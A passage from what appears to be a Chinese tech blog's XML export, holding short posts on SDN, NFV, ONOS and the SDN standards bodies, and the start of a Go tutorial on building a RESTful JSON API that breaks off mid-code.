<li>2006年，香港科技大学访问学者</li>
<li>2007年，温州大学计算机科学与工程学院副院长。</li>
<li>2009年至2010年，温州大学物理与电子信息工程学院副院长（原物理学院与计算机学院）</li>
<li>温州大学教务处处长、教师教学发展中心主任</li>
<li>中国计算机学会教育专委会常务委员、ACM SIGCSE（中国）分会副主席</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/" target="_blank" rel="noopener">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/" target="_blank" rel="noopener">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/" target="_blank" rel="noopener">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/" target="_blank" rel="noopener">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/" target="_blank" rel="noopener">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN-NFV</title>
    <url>/2019/06/07/SDN-NFV/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h4 id="SDN-vs-NFV"><a href="#SDN-vs-NFV" class="headerlink" title="SDN vs NFV"></a>SDN vs NFV</h4><p><strong>SDN:</strong> separates the network’s control (brains) and forwarding (muscle) planes and provides a centralized view of the distributed network for more efficient orchestration and automation of network services.</p>
<p><strong>NFV:</strong> focuses on optimizing the network services themselves. NFV decouples the network functions, such as DNS, Caching, etc., from proprietary hardware appliances, so they can run in software to accelerate service innovation and provisioning, particularly within service provider environments.</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/" target="_blank" rel="noopener">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/" target="_blank" rel="noopener">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/" target="_blank" rel="noopener">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/" target="_blank" rel="noopener">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/" target="_blank" rel="noopener">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>SDN技术指南：Open Network Operating System</title>
    <url>/2017/08/18/SDN-ONOS/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Samsung 主办 ONOS Build 2017</li>
<li>Google 加入CORD</li>
<li>ONOS vs. OpenDaylight</li>
</ul>
<span id="more"></span>
<blockquote>
<p>ONOS source code, written in Java</p>
</blockquote>
<h2 id="ONOS-Architecture"><a href="#ONOS-Architecture" class="headerlink" title="ONOS Architecture"></a>ONOS Architecture</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/SDN-CORD-architecture.png" alt=""></p>
<h2 id="Samsung-主办-ONOS-Build-2017"><a href="#Samsung-主办-ONOS-Build-2017" class="headerlink" title="Samsung 主办 ONOS Build 2017"></a>Samsung 主办 ONOS Build 2017</h2><p><a href="https://www.linux.com/blog/onos/2017/8/samsung-hosts-onos-build-2017-and-fuels-sdn-innovation">原文：Samsung Hosts ONOS Build 2017 and Fuels SDN Innovation</a></p>
<p>三星Samsung将于 9月 20-22 在韩国首尔的研发中心主办 ONOS Build 2017 。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/small-palace-tower-landmark-place-of-worship-temple.jpg" alt=""></p>
<p>开放网络操作系统(ONOS , Open Network Operating System) 社区在全世界各个地区快速发展，ONOS Build 2017 是开放网络基金会（ONF，Open Networking Foundation）组织的大型开发者大会，专注于 ONOS 项目的研发与推广工作，将于 2017 年 9 月 20 日- 22日在韩国首尔的三星研发中心举办。</p>
<p>本次年度活动将联合200多名开发商和贡献者一起分享，学习，调整，规划，和PK。大会将提供 ONOS 专家主题演讲，人们可以通过社区展示活动了解相关的工作信息，这将是一次演示汇报的 SDN 科技博览会 以及一次编程马拉松活动。我们也将了解到三星Samsung，作为开放网络基金会的合作伙伴之一，为什么投资 ONOS 建设。</p>
<h4 id="为什么三星投资主办-ONOS-大会"><a href="#为什么三星投资主办-ONOS-大会" class="headerlink" title="为什么三星投资主办 ONOS 大会 ?"></a>为什么三星投资主办 ONOS 大会 ?</h4><p>三星认为，通过开源社区的努力，ONS 项目作为组织的核心将铺平道路、加速革新。作为一家领先的网络解决方案提供商，三星很高兴能帮助那些正在推动创新并将SDN技术引入全球电信网络的开发人员。 </p>
<h4 id="什么三星投资-ONOS-项目"><a href="#什么三星投资-ONOS-项目" class="headerlink" title="什么三星投资 ONOS 项目 ?"></a>什么三星投资 ONOS 项目 ?</h4><p>ONOS 的目标是通过 SDN 的方式达到运营商级的性能指标，包括服务保证，可靠性和可扩展性和高性能。三星相信 ONOS 项目在实现传统网络转向灵活和可扩展系统方面以及走在前列，将使运营商能够更有效地运行他们的网络，为即将到来的5G 时代做好准备。<br>三星一直在积极地促成和加速塑造下一代网络服务，基于 ONOS 项目的开源 SDN 和网络虚拟化。我们相信三星的贡献将有助于满足运营商在电信领域提供领先的5G服务的要求。</p>
<h4 id="三星参与-ONOS-项目多久了"><a href="#三星参与-ONOS-项目多久了" class="headerlink" title="三星参与 ONOS 项目多久了 ?"></a>三星参与 ONOS 项目多久了 ?</h4><p>三星在 2014 年基于现成的 ONOS 项目开发了首个商业的 SDN 产品，并且在 2016年作为董事会成员加入 ONOS 项目。自从加入该项目，三星一直积极促进每个版本的发展，和其他运营商密切合作开发商业级的 SDN 解决方案。借助于大量具备丰富的 SDN 工作经验开发者、对电信网络整体架构的深刻理解，三星正在社区扮演一个社区规范主要贡献者的角色，有助于在市场中提升相关技术可用性。</p>
<h4 id="ONOS-Build-愿景"><a href="#ONOS-Build-愿景" class="headerlink" title="ONOS Build 愿景"></a>ONOS Build 愿景</h4><p>ONOS 大会是一个年度会议，将在世界不同地区举行，连接来自不同背景和行业的全球开发者。今年，我们邀请创新者到亚洲为亚太地区的学术和商业生态系统注入新的活力。此外，该活动将成为开发人员在SDN技术及应用中促进和分享其成果的平台。与会者通过年度共享，参与公开讨论，将增加创新 SDN 商业解决方案的水平，有助于SDN发展。最后，全球许多运营商将出席 ONOS 大会。通过连接运营商，我们希望我们能与开发者分享 SDN 的愿景和技术进步。这将极大地改变行业，帮助我们走向更大的网络的可能性。</p>
<h4 id="ONOS-2017-议程"><a href="#ONOS-2017-议程" class="headerlink" title="ONOS 2017 议程"></a>ONOS 2017 议程</h4><p>ONOS 2016 大会是首次建立一个强大的 SDN 技术基础的活动。近一年以来，有越来越多的移动运营商愿意将技术融入他们的网络。 ONOS  2017 大会将在电信行业参与者感知到快速变化的背景下召开的，将推动全球电信市场发展商业化的运营商级 SDN 。从内容上讲，今年的活动将持续3天，为与会者提供额外一天的对话会议，让他们深入了解彼此的技术并展示工作成果。最后一天，还将会有旨在介绍 CORD （Central Office Re-Architected as a Data Center）项目的相关进展。</p>
<h4 id="ONOS-Build-2017-Schedule"><a href="#ONOS-Build-2017-Schedule" class="headerlink" title="ONOS Build 2017 Schedule"></a><a href="http://onosbuild.org/schedule/">ONOS Build 2017 Schedule</a></h4><h2 id="相关资讯"><a href="#相关资讯" class="headerlink" title="相关资讯"></a>相关资讯</h2><h4 id="Google-加入CORD"><a href="#Google-加入CORD" class="headerlink" title="Google 加入CORD"></a>Google 加入CORD</h4><p>2016年7月26日，CORD 项目宣布成为Linux基金会下的一个独立的开源项目，Google、Radisys以及三星电子宣布加入该项目。CORD的愿景是为规模化的数据中心服务，CORD 创建了两个控制平面：一个使用ONOS控制器，负责网络服务；另外一个使用新的 CORD 操作系统 — XOS，管理VNFs，该操作系统将一切都看作服务。</p>
<h4 id="ONOS-vs-OpenDaylight"><a href="#ONOS-vs-OpenDaylight" class="headerlink" title="ONOS vs. OpenDaylight"></a>ONOS vs. OpenDaylight</h4><p>ONOS  的第一个版本由 Open Networking Lab (ON.Lab)  在2014年贡献到社区（源码用 Java 编写），2015年10月, ONOS 项目 作为 合作项目（collaborative） 加入 Linux Foundation。 OpenDaylight (ODL)  由 Linux Foundation 创建。两者在推动 SDN 的设计和目标上非常相似，主要是支持者和合作伙伴不同。ONOS 更倾向于网络运营商，更关注提供更好的整体网络性能；ODL更倾向于数据中心网络，设计上注重融合传统网络与 SDN 。</p>
<ul>
<li><a href="https://www.sdxcentral.com/sdn/definitions/opendaylight-project/">What is the OpenDaylight Project (ODL)?</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://en.wikipedia.org/wiki/ONOS">Wiki: ONOS</a></li>
<li><a href="http://opencord.org/">OpenCORD.org</a></li>
<li><a href="http://www.sdnlab.com/17777.html">sdnlab.com: AT&amp;T CORD架构解读</a></li>
<li><a href="http://www.sdnlab.com/17495.html">sdnlab.com: Google加入CORD</a></li>
<li><a href="https://opennetworking.org/about/onf-overview">OpenNetworking.org: ONF Overview</a></li>
<li><a href="http://searchsdn.techtarget.com/definition/ONOS-Open-Network-Operating-System">techtarget.com: ONOS (Open Network Operating System)</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title>SDN-ORG</title>
    <url>/2019/06/07/SDN-ORG/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><h4 id="标准化组织-ONF"><a href="#标准化组织-ONF" class="headerlink" title="标准化组织 ONF"></a>标准化组织 ONF</h4><p>开放网络基金会(Open Networking Foundation,ONF)是软件定义网络技术标准化和产业化的主要力量。</p>
<p>ONF 组织架构：</p>
<ul>
<li>拓展组</li>
<li>配置管理组</li>
<li>测试和互操作组</li>
<li>北向接口组</li>
<li>架构组</li>
<li>混合组</li>
<li>市场组</li>
</ul>
<p>ONF 主要工作：</p>
<ul>
<li>SDN 白皮书</li>
<li>OpenFlow 协议</li>
<li>OF-Config 协议</li>
</ul>
<h4 id="标准化组织-IETF"><a href="#标准化组织-IETF" class="headerlink" title="标准化组织 IETF"></a>标准化组织 IETF</h4><p>因特网工程任务组（IETF）：全球互联网最具权威的技术标准化组织。SDN 技术标准主要由网络设备厂商主导。</p>
<p>IETF 相关研究工作组：</p>
<ul>
<li>转发与控制分离组：主要关注需求、架构、协议、转发单元模型和MIB</li>
<li>应用层流量优化工作组：主要关注为应用层提供更多的网络信息，完成应用层的流量优化</li>
<li>路由领域公开的研究组：针对 I2RS 的问题描述、需求和应用场景</li>
</ul>
<h4 id="标准化组织-ITU-T"><a href="#标准化组织-ITU-T" class="headerlink" title="标准化组织 ITU-T"></a>标准化组织 ITU-T</h4><p>背景：国际电信联盟<br>主要关注：运营商网络的场景对象和相关架构</p>
<p>ITU-T 关于SDN的标志性项目：</p>
<ul>
<li>Y.FNsdn-fmV</li>
<li>Y.FNsdn</li>
</ul>
<h4 id="标准化组织-ETSI"><a href="#标准化组织-ETSI" class="headerlink" title="标准化组织 ETSI"></a>标准化组织 ETSI</h4><p>欧洲电信标准化协会（ETSI）</p>
<p>运营商发起成立网络功能虚拟化标准工作组（NFV ISG）,关注 SDN+NFV。</p>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="SDN技术专题"><a href="#SDN技术专题" class="headerlink" title="SDN技术专题"></a>SDN技术专题</h4><ul>
<li><a href="https://riboseyim.com/2017/05/12/SDN/">SDN 技术指南（一）: 架构概览</a></li>
<li><a href="https://riboseyim.com/2017/08/22/SDN-OpenFlow/">SDN 技术指南（二）：OpenFlow</a></li>
<li><a href="https://riboseyim.com/2017/10/16/SDN-Controller/">SDN 技术指南（三）：SDN Controller</a></li>
<li><a href="https://riboseyim.com/2017/10/13/SDN-OpenvSwitch/">SDN 技术指南（四）：Open vSwitch</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-NFV">SDN 技术指南（五）：NFV</a></li>
<li><a href="#">SDN 技术指南（六）：OpenStack or Kubernetes ? </a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-ORG/">SDN 技术指南（七）：标准化组织</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-CASE">SDN 技术指南（八）：案例教学</a></li>
<li><a href="https://riboseyim.com/2019/06/07/SDN-MOOC/">SDN技术指南（十）：在线课程推荐</a></li>
</ul>
<h4 id="网络编程专题"><a href="#网络编程专题" class="headerlink" title="网络编程专题"></a>网络编程专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/" target="_blank" rel="noopener">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/" target="_blank" rel="noopener">网络数据包的捕获与分析（libpcap、BPF及gopacket）</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/" target="_blank" rel="noopener">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
</ul>
<h4 id="网络安全专题"><a href="#网络安全专题" class="headerlink" title="网络安全专题"></a>网络安全专题</h4><ul>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/" target="_blank" rel="noopener">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/" target="_blank" rel="noopener">Cyber-Security|香港拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="云计算专题"><a href="#云计算专题" class="headerlink" title="云计算专题"></a>云计算专题</h4><ul>
<li><a href="https://riboseyim.com/2017/07/23/CloudComputing/">AWS or Azure : 云计算平台的趋势分析|Stack Overflow,2017</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2>]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>开源技术架构漫谈：基于Go语言快速构建RESTful API服务</title>
    <url>/2017/05/23/RestfulAPI/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>What is a JSON API?</li>
<li>启动一个RESTful服务</li>
<li>抽象数据模型</li>
<li>增加路径分发功能</li>
<li>重构：Handlers &amp; Router</li>
</ul>
<span id="more"></span>
<p>In this post, we will not only cover how to use Go to create a RESTful JSON API, but we will also talk about good RESTful design.</p>
<p>部分内容删减调整，原文请查看： <a href="https://thenewstack.io/make-a-restful-json-api-go/">Making a RESTful JSON API in Go,2014Nov</a></p>
<p><a href="http://www.linkedin.com/in/corylanou/">Author:CORY LANOU</a>:a full stack technologist who has specialized in start-ups for the last 17 years. I’m currently working at InfluxDB on their core data team. I also help lead and organizer several community technology meetups and do Go training.</p>
<h2 id="一、What-is-a-JSON-API"><a href="#一、What-is-a-JSON-API" class="headerlink" title="一、What is a JSON API?"></a>一、What is a JSON API?</h2><p>JSON API 是数据交互规范，用以定义客户端如何获取与修改资源，以及服务器如何响应对应请求。JSON API设计用来最小化请求的数量，以及客户端与服务器间传输的数据量。通过遵循共同的约定，可以提高开发效率，利用更普遍的工具,基于 JSON API 的客户端还能够充分利用缓存，以提升性能。(更多：<a href="http://jsonapi.org.cn/format/)。">http://jsonapi.org.cn/format/)。</a></p>
<p>示例：<br><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;links&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;posts.author&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://example.com/people/&#123;posts.author&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;people&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&quot;posts.comments&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;href&quot;</span>: <span class="string">&quot;http://example.com/comments/&#123;posts.comments&#125;&quot;</span>,</span><br><span class="line">      <span class="string">&quot;type&quot;</span>: <span class="string">&quot;comments&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">&quot;posts&quot;</span>: [&#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;Rails is Omakase&quot;</span>,</span><br><span class="line">    <span class="string">&quot;links&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;author&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line">      <span class="string">&quot;comments&quot;</span>: [ <span class="string">&quot;5&quot;</span>, <span class="string">&quot;12&quot;</span>, <span class="string">&quot;17&quot;</span>, <span class="string">&quot;20&quot;</span> ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h4 id="启动一个RESTful服务"><a href="#启动一个RESTful服务" class="headerlink" title="启动一个RESTful服务"></a>启动一个RESTful服务</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go run main.go</span><br><span class="line"></span><br><span class="line">$ curl http://localhost:8080</span><br><span class="line">Hello,<span class="string">&quot;/&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;html&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    http.HandleFunc(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">        fmt.Fprintf(w, <span class="string">&quot;Hello, %q&quot;</span>, html.EscapeString(r.URL.Path))</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, <span class="literal">nil</span>))</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="增加路径分发功能"><a href="#增加路径分发功能" class="headerlink" title="增加路径分发功能"></a>增加路径分发功能</h4><p>路径又称”终点”（endpoint），表示API的具体网址。在RESTful架构中，每个网址代表一种资源（resource）。<br>第三方组件（Gorilla Mux package）： “github.com/gorilla/mux”</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;log&quot;</span></span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    router := mux.NewRouter().StrictSlash(<span class="literal">true</span>)</span><br><span class="line">    router.HandleFunc(<span class="string">&quot;/&quot;</span>, Index)</span><br><span class="line">    router.HandleFunc(<span class="string">&quot;/todos&quot;</span>, TodoIndex)</span><br><span class="line">    router.HandleFunc(<span class="string">&quot;/todos/&#123;todoId&#125;&quot;</span>, TodoShow)</span><br><span class="line"></span><br><span class="line">    log.Fatal(http.ListenAndServe(<span class="string">&quot;:8080&quot;</span>, router))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprintln(w, <span class="string">&quot;Welcome!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoIndex</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    fmt.Fprintln(w, <span class="string">&quot;Todo Index!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TodoShow</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">    vars := mux.Vars(r)</span><br><span class="line">    todoId := vars[<span class="string">&quot;todoId&quot;</span>]</span><br><span class="line">    fmt.Fprintln(w, <span class="string">&quot;Todo show:&quot;</span>, todoId)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>访问测试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ curl http://localhost:8080/todo</span><br><span class="line">404 page not found</span><br><span class="line">$ curl http://localhost:8080/todos</span><br><span class="line">Todo Index! ,<span class="string">&quot;/todos&quot;</span></span><br><span class="line">$ curl http://localhost:8080/todos/&#123;123&#125;</span><br><span class="line">TodoShow: ,<span class="string">&quot;123&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="抽象数据模型"><a href="#抽象数据模型" class="headerlink" title="抽象数据模型"></a>抽象数据模型</h4><p>创建一个数据模型“Todo”、“Routes”。在其它语言中，使用类（class）实现。<br>在Go语言中，没有class，必须使用结构(struct)。</p>
<p><strong>Todo.go</strong><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Todo <span class="keyword">struct</span> &#123;</span><br><span class="line">      Id        <span class="keyword">int</span>       <span class="string">`json:&quot;id&quot;`</span></span><br><span class="line">      Name      <span class="keyword">string</span>    <span class="string">`json:&quot;name&quot;`</span></span><br><span class="line">      Completed <span class="keyword">bool</span>      <span class="string">`json:&quot;completed&quot;`</span></span><br><span class="line">      Due       time.Time <span class="string">`json:&quot;due&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Todos []Todo</span><br></pre></td></tr></table></figure></p>
<p><strong>Routes.go</strong><br><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;net/http&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/gorilla/mux&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Route <span class="keyword">struct</span> &#123;</span><br><span class="line">    Name        <span class="keyword">string</span></span><br><span class="line">    Method      <span class="keyword">string</span></span><br><span class="line">    Pattern     <span class="keyword">string</span></span><br><span class="line">    HandlerFunc http.HandlerFunc</span><br><span class="line">&#125;</span><br><span 